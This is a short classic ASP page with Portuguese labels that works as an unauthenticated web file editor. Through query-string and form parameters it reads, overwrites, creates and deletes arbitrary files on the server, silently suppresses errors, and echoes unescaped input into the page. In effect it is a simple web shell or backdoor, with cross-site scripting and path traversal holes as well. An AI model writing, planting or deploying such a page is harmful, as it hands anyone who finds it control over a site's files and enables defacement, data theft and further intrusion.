<%
on error resume next
nome_arquivo = Request.QueryString("arquivo")
Caminho_arquivo = Server.Mappath(nome_arquivo)
Set fso = CreateObject("Scripting.FileSystemObject")

If Request.QueryString("alterar") then
	nome = Request.Form("nome")
	Set arq = fso.CreateTextFile(nome)
	arq.writeline(Request.Form("arquivo"))
	Set arq = nothing
End if
If Request.QueryString("Deletar") then
	If fso.FileExists(caminho_arquivo) then
		Set arquivo = fso.DeleteFile(caminho_arquivo)
		msg = "Arquivo deletado."
	Else
		conteudo = "Caminho não encontrado."
	End if
End if
If fso.FileExists(caminho_arquivo) then
	Set arquivo = fso.OpenTextFile(caminho_arquivo)
	conteudo = ARQUIVO.READALL
Else
	conteudo = "Escreva aqui."
End if
%><em><%= msg %></em>
<form name="form1" method="post" action="EDITOR_DE_ARQUIVOS.ASP?ALTERAR=TRUE&arquivo=<%= nome_arquivo %>">
  <input name="NOME" type="text" id="NOME" value="<%= caminho_arquivo %>" size="80">
  <br>
  <textarea name="ARQUIVO" cols="80" rows="10" id="ARQUIVO"><%= conteudo %></textarea>
  <br>
  <input type="submit" name="Submit" value="ENVIAR">
  <input type="reset" name="Submit2" value="*DELETAR ARQUIVO" onClick="javascript:window.open('editor_de_arquivos.asp?arquivo=<%= nome_arquivo %>&deletar=true')">
</form>
<%
Set arquivo = nothing
Set fso = nothing
%>